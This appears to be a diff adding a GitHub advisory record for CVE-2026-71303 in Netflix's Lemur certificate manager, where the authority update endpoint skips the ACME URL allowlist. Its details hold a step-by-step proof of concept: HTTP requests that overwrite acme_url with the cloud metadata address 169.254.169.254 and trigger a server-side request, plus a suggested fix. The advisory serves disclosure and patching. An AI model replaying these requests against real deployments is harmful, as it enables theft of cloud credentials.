@@ -1,0 +1,76 @@
+{
+  "id": "GHSA-v5rc-cpwc-cfpr",
+  "modified": "2026-08-18T21:00:09.295288527Z",
+  "published": "2026-08-18T20:51:21Z",
+  "aliases": [
+    "CVE-2026-71303"
+  ],
+  "summary": "Lemur: Incomplete fix for GHSA-v2wp-frmc-5q3v -- ACME authority update endpoint allows non-admin to replace `acme_url` with internal IP, bypassing allowlist",
+  "details": "### Summary\n\nThe fix for GHSA-v2wp-frmc-5q3v added `_validate_acme_url()` to reject `acme_url` values not in `ACME_DIRECTORY_HOST_ALLOWLIST`, but the validation is only called at **authority creation time** (POST). The authority **update** endpoint (`PUT /api/1/authorities/\u003cid\u003e`) accepts and stores arbitrary `options` -- including a modified `acme_url` -- without invoking the allowlist check. Any user with an authority role (granted by an admin to allow issuing certificates via that authority) can therefore overwrite the stored `acme_url` with an internal IP or IMDS endpoint. The next certificate issuance via that authority causes Lemur's backend to fetch the attacker-controlled URL, achieving SSRF.\n\n### Details\n\n**Where the fix lives (POST path -- protected):**\n\n`lemur/plugins/lemur_acme/plugin.py` lines 333-337 (ACMEIssuerPlugin.create_authority):\n```python\nfor option in plugin_options:\n    if option.get(\"name\") == \"certificate\":\n        acme_root = option.get(\"value\")\n    if option.get(\"name\") == \"acme_url\":\n        _validate_acme_url(option.get(\"value\", \"\"))   # allowlist enforced\n```\n\n`_validate_acme_url` at line 35:\n```python\ndef _validate_acme_url(url):\n    \"\"\"Reject acme_url values that are not in the configured allowlist.\n\n    Called at authority creation time only -- existing authorities in the DB\n    were already trusted when they were created and are not re-validated.\n    \"\"\"\n    allowed_hosts = current_app.config.get(\n        \"ACME_DIRECTORY_HOST_ALLOWLIST\",\n        {\"acme-v02.api.letsencrypt.org\", ...},\n    )\n    parsed = urlparse(url)\n    if parsed.scheme != \"https\" or parsed.hostname not in allowed_hosts:\n        raise InvalidConfiguration(...)\n```\n\n**Where the gap is (PUT path -- unprotected):**\n\n`lemur/authorities/views.py` lines 405-424 (`Authorities.put`):\n```python\nauthority = service.get(authority_id)\nroles = [x.name for x in authority.roles]\npermission = AuthorityPermission(authority_id, roles)\n\nif not permission.can() or not StrictRolePermission().can():\n    return dict(message=\"You are not authorized to update this authority.\"), 403\n\nreturn service.update(\n    authority_id,\n    owner=data[\"owner\"],\n    description=data[\"description\"],\n    active=data[\"active\"],\n    roles=data[\"roles\"],\n    options=data.get(\"options\")        # stored verbatim -- no ACME URL check\n)\n```\n\n`lemur/authorities/service.py` lines 28-46 (`update`):\n```python\ndef update(authority_id, description, owner, active, roles, options=None):\n    authority = get(authority_id)\n    authority.roles = roles\n    authority.active = active\n    authority.description = description\n    authority.owner = owner\n    if options:\n        authority.options = options    # written to DB with no _validate_acme_url call\n    return database.update(authority)\n```\n\n**Where the SSRF sink is:**\n\n`lemur/plugins/lemur_acme/acme_handlers.py` lines 157-188:\n```python\nfor option in json.loads(authority.options):\n    options[option[\"name\"]] = option.get(\"value\")\ndirectory_url = options.get(\"acme_url\", current_app.config.get(\"ACME_DIRECTORY_URL\"))\n...\ndirectory = ClientV2.get_directory(directory_url, net)   # outbound HTTP to stored URL\n```\n\nWith the default configuration (`LEMUR_STRICT_ROLE_ENFORCEMENT = False`, reverted in 1.9.2 per the GHSA-qcqw-jwxc-2hqg correction), `StrictRolePermission().can()` passes for any non-read-only user. Any user granted membership in an authority's role group by an admin can therefore call `PUT /api/1/authorities/\u003cid\u003e` to overwrite `acme_url` with an arbitrary URL. The allowlist enforced at creation is silently discarded.\n\n### PoC\n\n**Prerequisites:**\n- Lemur 1.9.2, default config (`LEMUR_STRICT_ROLE_ENFORCEMENT` not set, defaults to `False`)\n- Admin grants non-admin user membership in an ACME authority's role (normal operational step to allow certificate issuance)\n- Attacker has a valid Lemur session token\n\n**Step 1 -- Authenticate as the non-admin user (role: TestRootCA_operator):**\n\n```\nPOST /api/1/auth/login HTTP/1.1\nHost: lemur.example.com\nContent-Type: application/json\n\n{\"username\": \"alice\", \"password\": \"...\"}\n```\n\nResponse (truncated):\n```json\n{\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}\n```\n\n**Step 2 -- Confirm identity (non-admin, no global operator role):**\n\n```\nGET /api/1/auth/me HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n```\n\nResponse:\n```json\n{\"username\": \"alice\", \"id\": 2, \"roles\": [{\"name\": \"TestRootCA_operator\"}]}\n```\n\n**Step 3 -- Overwrite acme_url with an internal IMDS endpoint via authority update:**\n\n```\nPUT /api/1/authorities/1 HTTP/1.1\nHost: lemur.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n\n{\n  \"owner\": \"security@example.com\",\n  \"description\": \"Let's Encrypt Production\",\n  \"active\": true,\n  \"roles\": [{\"id\": 5}, {\"id\": 6}, {\"id\": 7}],\n  \"options\": \"[{\\\"name\\\": \\\"acme_url\\\", \\\"value\\\": \\\"http://169.254.169.254/latest/meta-data/\\\"}]\"\n}\n```\n\nResponse (HTTP 200 -- no validation error):\n```json\n{\n  \"id\": 1,\n  \"name\": \"TestRootCA\",\n  \"description\": \"Let's Encrypt Production\",\n  \"options\": [{\"name\": \"acme_url\", \"value\": \"http://169.254.169.254/latest/meta-data/\"}],\n  ...\n}\n```\n\n**Live validation output (observed on Lemur 1.9.2, 2026-06-19):**\n\n```\nUser: nonadvuln | ID: 2 | Roles: ['TestRootCA_operator']\n\nPUT /api/1/authorities/1 -\u003e HTTP 200\nstored options: [{\"name\": \"acme_url\", \"value\": \"http://169.254.169.254/latest/meta-data/\"}]\n\nDB confirm (psql):\nSELECT options FROM authorities WHERE id=1;\n\"[{\\\"name\\\": \\\"acme_url\\\", \\\"value\\\": \\\"http://169.254.169.254/latest/meta-data/\\\"}]\"\n```\n\n**Step 4 -- Trigger SSRF:**\n\nIssue any certificate via authority 1 (using the same or any other user with certificate issuance rights). Lemur's celery worker calls `AcmeHandler.setup_acme_client()`, which executes:\n\n```python\ndirectory_url = options.get(\"acme_url\", ...)  # reads stored malicious URL\ndirectory = ClientV2.get_directory(directory_url, net)  # outbound request\n```\n\nThe backend issues an HTTP GET to `http://169.254.169.254/latest/meta-data/`, achieving SSRF to the instance metadata service (or any other internal endpoint the Lemur host can reach).\n\n**Suggested fix:**\n\nCall `_validate_acme_url()` inside `service.update()` (or in `Authorities.put`) whenever the `options` field is provided and the authority uses an ACME-based issuer plugin:\n\n```python\n# in lemur/authorities/service.py  update()\nif options:\n    from lemur.plugins.lemur_acme.plugin import _validate_acme_url\n    import json\n    for opt in json.loads(options) if isinstance(options, str) else options:\n        if opt.get(\"name\") == \"acme_url\":\n            _validate_acme_url(opt.get(\"value\", \"\"))\n    authority.options = options\n```\n\n### Impact\n\nAn authenticated Lemur user who has been granted membership in any ACME authority's role group can overwrite that authority's `acme_url` with an arbitrary URL, bypassing the `ACME_DIRECTORY_HOST_ALLOWLIST` enforced at creation time. On the next certificate issuance via that authority, Lemur's backend issues an outbound HTTP request to the attacker-controlled URL. In cloud-hosted deployments this allows reading the instance metadata service (AWS IMDSv1, GCP metadata server, Azure IMDS), potentially yielding IAM credentials or other sensitive instance data. In on-premises or private-cloud deployments this allows probing internal services that the Lemur server can reach but external callers cannot.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lemur",
+        "purl": "pkg:pypi/lemur"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.11.0",
+        "0.2.1",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0",
+        "1.1.0",
+        "1.2.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.8.2",
+        "1.9.0",
+        "1.9.1",
+        "1.9.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.9.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-v5rc-cpwc-cfpr/GHSA-v5rc-cpwc-cfpr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Netflix/lemur/security/advisories/GHSA-v5rc-cpwc-cfpr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Netflix/lemur/commit/edca0390f930344d65ff4ca37a669c2320e3dfad"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Netflix/lemur"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Netflix/lemur/releases/tag/v1.9.3"
+    }
+  ]
+}
